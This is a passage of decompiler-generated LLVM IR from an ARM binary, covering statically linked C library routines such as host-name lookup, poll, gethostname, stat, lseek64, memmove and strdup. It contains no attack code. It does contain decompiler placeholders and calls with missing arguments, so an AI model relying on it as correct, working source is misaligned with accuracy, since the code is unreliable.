  br label %dec_label_pc_1c110

.thread4:                                         ; preds = %dec_label_pc_1c0e8
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1c110

dec_label_pc_1c0fc:                               ; preds = %dec_label_pc_1c0dc
  %v0_1c0fc = load i32, i32* @r4, align 4
  %v1_1c0fc = inttoptr i32 %v0_1c0fc to i32*
  %v2_1c0fc = load i32, i32* %v1_1c0fc, align 4
  store i32 %v2_1c0fc, i32* %r3.global-to-local, align 4
  %v7_1c100 = icmp eq i32 %v2_1c0fc, 2
  br i1 %v7_1c100, label %dec_label_pc_1c108, label %dec_label_pc_1c33c

dec_label_pc_1c108:                               ; preds = %dec_label_pc_1c0fc, %dec_label_pc_1c0d4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1c110

dec_label_pc_1c110:                               ; preds = %.thread4, %bb35, %dec_label_pc_1c108
  %storemerge2 = phi i32 [ 0, %dec_label_pc_1c108 ], [ 0, %bb35 ], [ 1, %.thread4 ]
  store i32 %tmp18, i32* @ip, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1c118 = load i32, i32* @r8, align 4
  %v1_1c118 = load i32, i32* @r4, align 4
  %v2_1c118 = inttoptr i32 %v1_1c118 to i32*
  store i32 %v0_1c118, i32* %v2_1c118, align 4
  %v0_1c11c = load i32, i32* @sl, align 4
  %v1_1c11c = inttoptr i32 %v0_1c11c to i8*
  store i32 %v0_1c11c, i32* %r0.global-to-local, align 4
  %v0_1c120 = load i32, i32* @r3, align 4
  %v1_1c120 = load i32, i32* @ip, align 4
  %v2_1c120 = inttoptr i32 %v1_1c120 to i32*
  store i32 %v0_1c120, i32* %v2_1c120, align 4
  %v3_1c124 = call i32 @strlen(i8* %v1_1c11c)
  store i32 %v3_1c124, i32* %r0.global-to-local, align 4
  %v1_1c128 = add i32 %v3_1c124, 1
  store i32 %v1_1c128, i32* @r4, align 4
  %v0_1c12c = load i32, i32* @r6, align 4
  %v7_1c130 = icmp sgt i32 %v0_1c12c, %v1_1c128
  br i1 %v7_1c130, label %dec_label_pc_1c134, label %dec_label_pc_1c338

dec_label_pc_1c134:                               ; preds = %dec_label_pc_1c110
  %v0_1c134 = load i32, i32* @sl, align 4
  store i32 %v0_1c134, i32* @r1, align 4
  store i32 %v1_1c128, i32* @r2, align 4
  store i32 %v0_1c05c, i32* @r0, align 4
  %v0_1c140 = call i32 @memcpy()
  store i32 %v0_1c140, i32* %r0.global-to-local, align 4
  %v1_1c148 = load i32, i32* @r4, align 4
  %v2_1c148 = add i32 %v1_1c148, %v0_1c05c
  %v1_1c14c = sub i32 0, %v2_1c148
  %v1_1c150 = load i32, i32* @r6, align 4
  %v2_1c150 = sub i32 %v1_1c150, %v1_1c148
  store i32 %v2_1c150, i32* %r2.global-to-local, align 4
  %v1_1c154 = urem i32 %v1_1c14c, 4
  store i32 %v1_1c154, i32* %r3.global-to-local, align 4
  %v2_1c158 = sub i32 %v2_1c150, %v1_1c154
  store i32 %v2_1c158, i32* @sb, align 4
  %v1_1c15c = add i32 %v2_1c158, -8
  store i32 %v1_1c15c, i32* @r5, align 4
  %v7_1c164 = icmp slt i32 %v1_1c15c, 256
  br i1 %v7_1c164, label %dec_label_pc_1c338, label %dec_label_pc_1c168

dec_label_pc_1c168:                               ; preds = %dec_label_pc_1c134
  %v2_1c168 = add i32 %v1_1c154, %v2_1c148
  store i32 %v2_1c168, i32* @fp, align 4
  store i32 %v0_1c05c, i32* %ip.global-to-local, align 4
  %v1_1c170 = add i32 %v2_1c168, 8
  store i32 %v1_1c170, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_1c178 = add i32 %v2_1c168, 16
  store i32 %v1_1c178, i32* @r8, align 4
  %v4_1c17c = inttoptr i32 %v2_1c168 to i32*
  store i32 %v0_1c05c, i32* %v4_1c17c, align 4
  %v0_1c180 = load i32, i32* @sl, align 4
  store i32 %v0_1c180, i32* %r0.global-to-local, align 4
  %v0_1c184 = load i32, i32* @r4, align 4
  %v1_1c184 = load i32, i32* @fp, align 4
  %v2_1c184 = add i32 %v1_1c184, 4
  %v3_1c184 = inttoptr i32 %v2_1c184 to i32*
  store i32 %v0_1c184, i32* %v3_1c184, align 4
  %v0_1c188 = load i32, i32* @r8, align 4
  %v2_1c18c = inttoptr i32 %v0_1c180 to i8*
  %v3_1c18c = call i32 @inet_aton(i8* %v2_1c18c, i32 %v0_1c188)
  store i32 %v3_1c18c, i32* %r0.global-to-local, align 4
  %v1_1c190 = load i32, i32* @r4, align 4
  %v9_1c190 = icmp eq i32 %v3_1c18c, %v1_1c190
  br i1 %v9_1c190, label %dec_label_pc_1c1d4, label %dec_label_pc_1c198

dec_label_pc_1c198:                               ; preds = %dec_label_pc_1c168
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_1c19c = load i32, i32* @r7, align 4
  %v2_1c19c = add i32 %v1_1c19c, 8
  %v3_1c19c = inttoptr i32 %v2_1c19c to i32*
  store i32 2, i32* %v3_1c19c, align 4
  %v0_1c1a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_1c1a0 = mul i32 %v0_1c1a0, 2
  %v1_1c1a4 = load i32, i32* @r7, align 4
  %v2_1c1a4 = add i32 %v1_1c1a4, 12
  %v3_1c1a4 = inttoptr i32 %v2_1c1a4 to i32*
  store i32 %v2_1c1a0, i32* %v3_1c1a4, align 4
  %v3_1c1a8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1c1a8, i32* %r2.global-to-local, align 4
  store i32 %v0_1c05c, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* @ip, align 4
  %v0_1c1b4 = load i32, i32* @r4, align 4
  store i32 %v0_1c1b4, i32* @r5, align 4
  %v0_1c1b8 = load i32, i32* @r8, align 4
  %v1_1c1b8 = load i32, i32* @fp, align 4
  %v2_1c1b8 = add i32 %v1_1c1b8, 8
  %v3_1c1b8 = inttoptr i32 %v2_1c1b8 to i32*
  store i32 %v0_1c1b8, i32* %v3_1c1b8, align 4
  %v0_1c1bc = load i32, i32* @r7, align 4
  %v1_1c1bc = load i32, i32* %r2.global-to-local, align 4
  %v2_1c1bc = inttoptr i32 %v1_1c1bc to i32*
  store i32 %v0_1c1bc, i32* %v2_1c1bc, align 4
  %v0_1c1c0 = load i32, i32* @r7, align 4
  %v1_1c1c0 = inttoptr i32 %v0_1c1c0 to i32*
  %v2_1c1c0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v2_1c1c0, i32* %v1_1c1c0, align 4
  %v3_1c1c0 = add i32 %v0_1c1c0, 4
  %v4_1c1c0 = inttoptr i32 %v3_1c1c0 to i32*
  %v5_1c1c0 = load i32, i32* @fp, align 4
  store i32 %v5_1c1c0, i32* %v4_1c1c0, align 4
  %v0_1c1c4 = load i32, i32* @r6, align 4
  %v1_1c1c4 = load i32, i32* @r7, align 4
  %v2_1c1c4 = add i32 %v1_1c1c4, 16
  %v3_1c1c4 = inttoptr i32 %v2_1c1c4 to i32*
  store i32 %v0_1c1c4, i32* %v3_1c1c4, align 4
  %v0_1c1c8 = load i32, i32* @r4, align 4
  %v1_1c1c8 = load i32, i32* @ip, align 4
  %v2_1c1c8 = inttoptr i32 %v1_1c1c8 to i32*
  store i32 %v0_1c1c8, i32* %v2_1c1c8, align 4
  %v0_1c1cc = load i32, i32* @r4, align 4
  %v1_1c1cc = load i32, i32* @r6, align 4
  %v2_1c1cc = add i32 %v1_1c1cc, 4
  %v3_1c1cc = inttoptr i32 %v2_1c1cc to i32*
  store i32 %v0_1c1cc, i32* %v3_1c1cc, align 4
  br label %dec_label_pc_1c33c

dec_label_pc_1c1d4:                               ; preds = %dec_label_pc_1c168
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_1c1d8 = icmp eq i32 %storemerge2, 0
  br i1 %v2_1c1d8, label %dec_label_pc_1c1f0, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1c1d4
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1c0c8, align 4
  br label %dec_label_pc_1c33c

dec_label_pc_1c1f0:                               ; preds = %dec_label_pc_1c1d4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_1c1fc = load i32, i32* @sl, align 4
  store i32 %v0_1c1fc, i32* %r0.global-to-local, align 4
  %v2_1c204 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1c204, i32* %r2.global-to-local, align 4
  %v2_1c208 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1c208, i32* %r3.global-to-local, align 4
  %v7_1c214 = inttoptr i32 %v0_1c1fc to i8*
  %v8_1c214 = call i32 @__dns_lookup(i8* %v7_1c214, i32 1, i32 %v2_1c204, i32 %v2_1c208)
  store i32 %v8_1c214, i32* %r0.global-to-local, align 4
  %v1_1c218 = icmp slt i32 %v8_1c214, 0
  br i1 %v1_1c218, label %.thread, label %dec_label_pc_1c230

.thread:                                          ; preds = %dec_label_pc_1c1f0
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1c0c8, align 4
  br label %dec_label_pc_1c33c

dec_label_pc_1c230:                               ; preds = %dec_label_pc_1c1f0
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_1c234 = icmp eq i32 %tmp12, 1
  br i1 %v7_1c234, label %dec_label_pc_1c23c, label %dec_label_pc_1c314

dec_label_pc_1c23c:                               ; preds = %dec_label_pc_1c230
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_1c254 = load i32, i32* @r5, align 4
  %v2_1c254 = add i32 %v0_1c254, -12
  store i32 %v2_1c254, i32* @r8, align 4
  %v8_1c254 = icmp slt i32 %v2_1c254, 0
  br i1 %v8_1c254, label %bb37, label %dec_label_pc_1c260

bb37:                                             ; preds = %dec_label_pc_1c23c
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1c324

dec_label_pc_1c260:                               ; preds = %dec_label_pc_1c23c
  %v0_1c260 = load i32, i32* @r6, align 4
  store i32 %v0_1c260, i32* @r1, align 4
  %v2_1c264 = add i32 %v0_1c260, 12
  store i32 %v2_1c264, i32* @r0, align 4
  %v2_1c268 = call i32 @memmove(i32 %v2_1c264, i32 %v0_1c260)
  %v0_1c26c = load i32, i32* @fp, align 4
  %v1_1c26c = add i32 %v0_1c26c, 4
  store i32 %v1_1c26c, i32* @r3, align 4
  %v1_1c270 = load i32, i32* @r4, align 4
  %v2_1c270 = add i32 %v1_1c270, %v1_1c26c
  store i32 %v2_1c270, i32* @r5, align 4
  store i32 %v2_1c270, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_1c280 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1c28c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c28c

dec_label_pc_1c28c:                               ; preds = %dec_label_pc_1c28c, %dec_label_pc_1c260
  %v0_1c28c = phi i32 [ %v0_1c28c.pre, %dec_label_pc_1c260 ], [ %v1_1c290, %dec_label_pc_1c28c ]
  %v1_1c28c = load i32, i32* @r6, align 4
  %v7_1c28c = inttoptr i32 %v1_1c28c to i32*
  store i32 %v0_1c28c, i32* %v7_1c28c, align 4
  %v0_1c290 = load i32, i32* @r5, align 4
  %v1_1c290 = add i32 %v0_1c290, 4
  store i32 %v1_1c290, i32* @r5, align 4
  %v0_1c294 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c294 = add i32 %v0_1c294, 1
  store i32 %v1_1c294, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_1c294, 0
  br i1 %tmp38, label %dec_label_pc_1c28c, label %dec_label_pc_1c2a4

dec_label_pc_1c2a4:                               ; preds = %dec_label_pc_1c28c
  %v3_1c2a4 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1c2a4, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1c2ac = icmp eq i32 %v3_1c2a4, 0
  %v1_1c2b0 = load i32, i32* @r6, align 4
  %v5_1c2b0 = mul i32 %v1_1c294, 4
  %v6_1c2b0 = add i32 %v1_1c2b0, %v5_1c2b0
  %v7_1c2b0 = inttoptr i32 %v6_1c2b0 to i32*
  store i32 0, i32* %v7_1c2b0, align 4
  br i1 %v2_1c2ac, label %dec_label_pc_1c2e0, label %dec_label_pc_1c2b8

dec_label_pc_1c2b8:                               ; preds = %dec_label_pc_1c2a4
  %v0_1c2b8 = load i32, i32* @r4, align 4
  %v1_1c2b8 = inttoptr i32 %v0_1c2b8 to i8*
  store i32 %v0_1c2b8, i32* %r0.global-to-local, align 4
  %v3_1c2bc = call i32 @strlen(i8* %v1_1c2b8)
  store i32 %v3_1c2bc, i32* %r0.global-to-local, align 4
  %v0_1c2c0 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_1c2c0, %v3_1c2bc
  br i1 %tmp, label %dec_label_pc_1c2c8, label %dec_label_pc_1c2e0

dec_label_pc_1c2c8:                               ; preds = %dec_label_pc_1c2b8
  %v0_1c2c8 = load i32, i32* @r4, align 4
  store i32 %v0_1c2c8, i32* @r1, align 4
  %v0_1c2cc = load i32, i32* @r5, align 4
  store i32 %v0_1c2cc, i32* %r0.global-to-local, align 4
  %v2_1c2d0 = inttoptr i32 %v0_1c2cc to i8*
  %v3_1c2d0 = call i32 @strcpy(i8* %v2_1c2d0, i32 %v0_1c2c8)
  store i32 %v3_1c2d0, i32* %r0.global-to-local, align 4
  %v0_1c2d4 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c2e0

dec_label_pc_1c2e0:                               ; preds = %dec_label_pc_1c2b8, %dec_label_pc_1c2a4, %dec_label_pc_1c2c8
  %storemerge1 = phi i32 [ %v0_1c2d4, %dec_label_pc_1c2c8 ], [ %v0_1c05c, %dec_label_pc_1c2b8 ], [ %v0_1c05c, %dec_label_pc_1c2a4 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1c2e4 = load i32, i32* @r7, align 4
  %v2_1c2e4 = add i32 %v1_1c2e4, 8
  %v3_1c2e4 = inttoptr i32 %v2_1c2e4 to i32*
  store i32 2, i32* %v3_1c2e4, align 4
  %v0_1c2e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_1c2e8 = mul i32 %v0_1c2e8, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1c2f0 = load i32, i32* @r7, align 4
  %v2_1c2f0 = add i32 %v1_1c2f0, 12
  %v3_1c2f0 = inttoptr i32 %v2_1c2f0 to i32*
  store i32 %v2_1c2e8, i32* %v3_1c2f0, align 4
  %v3_1c2f4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1c2f4, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_1c2fc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1c2fc, i32* @r5, align 4
  %v0_1c300 = load i32, i32* @r7, align 4
  %v2_1c300 = inttoptr i32 %v3_1c2f4 to i32*
  store i32 %v0_1c300, i32* %v2_1c300, align 4
  %v0_1c304 = load i32, i32* @r7, align 4
  %v1_1c304 = inttoptr i32 %v0_1c304 to i32*
  %v2_1c304 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1c304, i32* %v1_1c304, align 4
  %v3_1c304 = add i32 %v0_1c304, 4
  %v4_1c304 = inttoptr i32 %v3_1c304 to i32*
  %v5_1c304 = load i32, i32* @fp, align 4
  store i32 %v5_1c304, i32* %v4_1c304, align 4
  %v0_1c308 = load i32, i32* @r6, align 4
  %v1_1c308 = load i32, i32* @r7, align 4
  %v2_1c308 = add i32 %v1_1c308, 16
  %v3_1c308 = inttoptr i32 %v2_1c308 to i32*
  store i32 %v0_1c308, i32* %v3_1c308, align 4
  %v0_1c30c = load i32, i32* %r3.global-to-local, align 4
  %v1_1c30c = load i32, i32* %r2.global-to-local, align 4
  %v2_1c30c = inttoptr i32 %v1_1c30c to i32*
  store i32 %v0_1c30c, i32* %v2_1c30c, align 4
  br label %dec_label_pc_1c324

dec_label_pc_1c314:                               ; preds = %dec_label_pc_1c230
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_1c0c8, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_1c324

dec_label_pc_1c324:                               ; preds = %bb37, %dec_label_pc_1c2e0, %dec_label_pc_1c314
  %v3_1c324 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1c324, i32* @r0, align 4
  %v0_1c328 = call i32 @free()
  %v3_1c32c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1c32c, i32* @r0, align 4
  %v0_1c330 = call i32 @free()
  store i32 %v0_1c330, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c33c

dec_label_pc_1c338:                               ; preds = %dec_label_pc_1c110, %dec_label_pc_1c134
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1c33c

dec_label_pc_1c33c:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_1c0fc, %dec_label_pc_1c0dc, %dec_label_pc_1c324, %dec_label_pc_1c198, %dec_label_pc_1c338
  %v0_1c33c = load i32, i32* @r5, align 4
  store i32 %v0_1c33c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1c33c

; uselistorder directives
  uselistorder i32 %v0_1c2b8, { 1, 0 }
  uselistorder i32 %v1_1c294, { 1, 0, 2 }
  uselistorder i32 %v1_1c290, { 1, 0 }
  uselistorder i32 %v0_1c260, { 1, 0, 2 }
  uselistorder i32 %v2_1c254, { 1, 0 }
  uselistorder i32 %v1_1c154, { 2, 1, 0 }
  uselistorder i32 %v1_1c148, { 1, 0 }
  uselistorder i32 %v0_1c11c, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_1c0c8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1c068, { 1, 0 }
  uselistorder i32 %v0_1c05c, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 19, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 5, 4, 7, 6, 8, 19, 20, 10, 9, 12, 11, 13, 15, 14, 17, 16, 18 }
  uselistorder i32 ()* @free, { 23, 22, 21, 20, 19, 18, 12, 11, 10, 9, 8, 7, 6, 5, 4, 24, 30, 29, 28, 17, 16, 15, 14, 1, 13, 27, 26, 25, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_1c33c, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_1c338, { 1, 0 }
  uselistorder label %dec_label_pc_1c324, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1c2e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c110, { 2, 0, 1 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1c34c = load i32, i32* @r7, align 4
  store i32 %v3_1c34c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1c374, label %dec_label_pc_1c364

dec_label_pc_1c364:                               ; preds = %entry
  %v0_1c364 = call i32 @__GI___errno_location()
  %v0_1c368 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c368 = sub i32 0, %v0_1c368
  %v2_1c36c = inttoptr i32 %v0_1c364 to i32*
  store i32 %v1_1c368, i32* %v2_1c36c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1c378.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1c374

dec_label_pc_1c374:                               ; preds = %entry, %dec_label_pc_1c364
  %v2_1c378 = phi i32 [ %v3_1c34c, %entry ], [ %v2_1c378.pre, %dec_label_pc_1c364 ]
  %v0_1c374 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1c364 ]
  store i32 %v2_1c378, i32* @r7, align 4
  ret i32 %v0_1c374

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1c374, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_1c38c = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1c39c = call i32 @uname(i32 %v2_1c38c)
  %v7_1c3a0 = icmp eq i32 %v1_1c39c, -1
  br i1 %v7_1c3a0, label %bb, label %dec_label_pc_1c3ac

bb:                                               ; preds = %entry
  store i32 %v1_1c39c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c3e8

dec_label_pc_1c3ac:                               ; preds = %entry
  %v2_1c3ac = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_1c3b4 = call i32 @strlen(i8* %tmp10)
  %v1_1c3b8 = add i32 %v3_1c3b4, 1
  %v1_1c3bc = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1c3b8, %v1_1c3bc
  br i1 %tmp, label %dec_label_pc_1c3c4, label %dec_label_pc_1c3d8

dec_label_pc_1c3c4:                               ; preds = %dec_label_pc_1c3ac
  %v0_1c3c4 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1c3d0 = inttoptr i32 %v0_1c3c4 to i32*
  store i32 22, i32* %v2_1c3d0, align 4
  %v0_1c3e8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c3e8

dec_label_pc_1c3d8:                               ; preds = %dec_label_pc_1c3ac
  %v0_1c3d8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_1c3ac, i32* @r1, align 4
  %v2_1c3e0 = inttoptr i32 %v0_1c3d8 to i8*
  %v3_1c3e0 = call i32 @strcpy(i8* %v2_1c3e0, i32 %v2_1c3ac)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c3e8

dec_label_pc_1c3e8:                               ; preds = %bb, %dec_label_pc_1c3c4, %dec_label_pc_1c3d8
  %v0_1c3e8 = phi i32 [ %v1_1c39c, %bb ], [ %v0_1c3e8.pre, %dec_label_pc_1c3c4 ], [ 0, %dec_label_pc_1c3d8 ]
  ret i32 %v0_1c3e8

; uselistorder directives
  uselistorder i32 %v2_1c3ac, { 1, 0 }
  uselistorder i32 %v1_1c39c, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 22, { 3, 17, 4, 5, 19, 6, 7, 8, 9, 15, 10, 11, 12, 16, 13, 0, 18, 14, 1, 2, 20 }
  uselistorder label %dec_label_pc_1c3e8, { 2, 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1c430, label %dec_label_pc_1c41c

dec_label_pc_1c41c:                               ; preds = %entry
  %v0_1c41c = call i32 @__GI___errno_location()
  %v0_1c420 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c420 = sub i32 0, %v0_1c420
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1c428 = inttoptr i32 %v0_1c41c to i32*
  store i32 %v1_1c420, i32* %v2_1c428, align 4
  br label %dec_label_pc_1c440

dec_label_pc_1c430:                               ; preds = %entry
  %v2_1c430 = icmp eq i32 %arg1, 0
  br i1 %v2_1c430, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1c430
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1c430, %bb
  call void @__pseudo_cond_branch(i1 %v2_1c430, i32 ptrtoint (i32* @global_var_1a544.1325 to i32))
  br label %dec_label_pc_1c440

dec_label_pc_1c440:                               ; preds = %dec_label_pc_1c41c, %.thread
  %v0_1c440 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1c440

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1c440, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1c490, label %dec_label_pc_1c47c

dec_label_pc_1c47c:                               ; preds = %entry
  %v0_1c47c = call i32 @__GI___errno_location()
  %v0_1c480 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c480 = sub i32 0, %v0_1c480
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1c488 = inttoptr i32 %v0_1c47c to i32*
  store i32 %v1_1c480, i32* %v2_1c488, align 4
  %v0_1c498.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c498

dec_label_pc_1c490:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_1c490 = icmp eq i32 %arg1, 0
  br i1 %v2_1c490, label %dec_label_pc_1c4a4, label %dec_label_pc_1c498

dec_label_pc_1c498:                               ; preds = %dec_label_pc_1c490, %dec_label_pc_1c47c
  %v0_1c498 = phi i32 [ %arg1, %dec_label_pc_1c490 ], [ %v0_1c498.pre, %dec_label_pc_1c47c ]
  br label %dec_label_pc_1c4a8

dec_label_pc_1c4a4:                               ; preds = %dec_label_pc_1c490
  br label %dec_label_pc_1c4a8

dec_label_pc_1c4a8:                               ; preds = %dec_label_pc_1c498, %dec_label_pc_1c4a4
  %v1_1c4b0 = phi i32 [ %v0_1c498, %dec_label_pc_1c498 ], [ %tmp8, %dec_label_pc_1c4a4 ]
  ret i32 %v1_1c4b0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1c4a8, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1c4c0 = load i32, i32* @r0, align 4
  %v1_1c4c0 = load i32, i32* @r1, align 4
  %v2_1c4c0 = inttoptr i32 %v0_1c4c0 to i8*
  %v3_1c4c0 = call i32 @_memcpy(i8* %v2_1c4c0, i32 %v1_1c4c0)
  ret i32 %v3_1c4c0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1c4d0 = load i32, i32* @r4, align 4
  store i32 %v3_1c4d0, i32* %stack_var_-16, align 4
  %v9_1c4d0 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_1c4d8 = call i32 @strlen(i8* %arg1)
  %v1_1c4dc = add i32 %v3_1c4d8, 1
  store i32 %v1_1c4dc, i32* @r4, align 4
  %v1_1c4e4 = call i32 @malloc(i32 %v1_1c4dc)
  store i32 %v1_1c4e4, i32* %r5.global-to-local, align 4
  %v2_1c4e8 = icmp eq i32 %v1_1c4e4, 0
  br i1 %v2_1c4e8, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_1c4f4 = xor i1 %v2_1c4e8, true
  call void @__pseudo_cond_branch(i1 %v1_1c4f4, i32 ptrtoint (i32* @global_var_142c0.1247 to i32))
  %v0_1c4f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c4fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1c4fc, i32* @r4, align 4
  store i32 %v9_1c4d0, i32* @r6, align 4
  ret i32 %v0_1c4f8

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 14, 13, 12, 6, 5, 15, 16, 22, 11, 10, 9, 1, 8, 7, 21, 20, 19, 18, 17, 4, 3, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
